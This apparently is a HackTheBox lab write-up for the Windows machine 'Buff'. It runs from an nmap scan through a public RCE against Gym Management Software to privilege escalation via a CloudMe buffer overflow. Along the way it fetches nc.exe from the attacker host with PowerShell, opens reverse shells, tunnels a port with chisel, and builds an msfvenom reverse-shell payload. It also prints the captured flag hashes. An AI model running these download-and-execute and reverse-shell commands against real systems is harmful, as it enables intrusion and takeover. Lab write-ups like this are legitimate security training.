---
title: "Buff"
date: 2025-06-05
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Buff

![](../assets/Pasted%20image%2020250604235743.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.198
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 00:06 CEST
Nmap scan report for 10.10.10.198
Host is up (0.041s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   40.94 ms 10.10.14.1
2   41.27 ms 10.10.10.198

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.83 seconds
```

`Port` `8080` shows a site about fitness.

![](../assets/Pasted%20image%2020250605001326.png)

The site is made with `Gym Management Software 1.0`.

![](../assets/Pasted%20image%2020250605001640.png)

## Initial Access

Using `searchsploit`, get the unauthenticated RCE one and execute it.

![](../assets/Pasted%20image%2020250605102916.png)

```shell
$ python2 48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                 
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun
```

Get the flag:

```shell
C:\xampp\htdocs\gym\upload> type C:\users\shaun\desktop\user.txt
�PNG
▒
47643683f9c91176910ec622fc4b20f9
```

## Privilege Escalation

Transfer `nc.exe` to the host and get a reverse shell

```shell
C:\xampp\htdocs\gym\upload> powershell.exe -c iwr -uri http://10.10.14.14:8000/nc.exe -outfile C:\users\shau
�PNG
▒
```

```shell
C:\xampp\htdocs\gym\upload> C:\users\shaun\nc.exe 10.10.14.14 5555 -e cmd.exe
```

```shell
$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.198] 49833
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun
```

There is a `CloudMe_1112.exe` in `shaun`'s downloads folder. We can see in the official documentation that the default port is `8888`.

```shell
PS C:\users\shaun\downloads> netstat -ano | findstr 8888
netstat -ano | findstr 8888
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       4996
```

Transfer `chisel` to expose the port.

```shell
$ ./chisel server --port 5555 --reverse                        
2025/06/05 23:07:25 server: Reverse tunnelling enabled
2025/06/05 23:07:25 server: Fingerprint PfHQvvl62LmfoeerrJeKwQTGw8wsiz5DkAonqhI5IYA=
2025/06/05 23:07:25 server: Listening on http://0.0.0.0:5555
2025/06/05 23:08:59 server: session#1: tun: proxy#R:8888=>localhost:8888: Listening
```

```shell
PS C:\users\shaun\downloads> iwr -uri http://10.10.14.14:8000/chisel.exe -outfile chisel.exe
iwr -uri http://10.10.14.14:8000/chisel.exe -outfile chisel.exe
PS C:\users\shaun\downloads> .\chisel.exe client 10.10.14.14:5555 R:8888:localhost:8888
.\chisel.exe client 10.10.14.14:5555 R:8888:localhost:8888
2025/06/05 22:09:00 client: Connecting to ws://10.10.14.14:5555
2025/06/05 22:09:00 client: Connected (Latency 40.8734ms)
```

Using `searchsploit`:

![](../assets/Pasted%20image%2020250605231529.png)

Get the first one and edit it; we need to change the payload from executing the calculator to a reverse shell.

```shell
$ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
```

Set the listener and execute the script.

```shell
$ sudo rlwrap nc -lnvp 443                     
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.198] 49935
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator
```

## Post Exploitation

Get the flag:

```shell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
d9125a41ab7239a80a93d04b6999f906
```
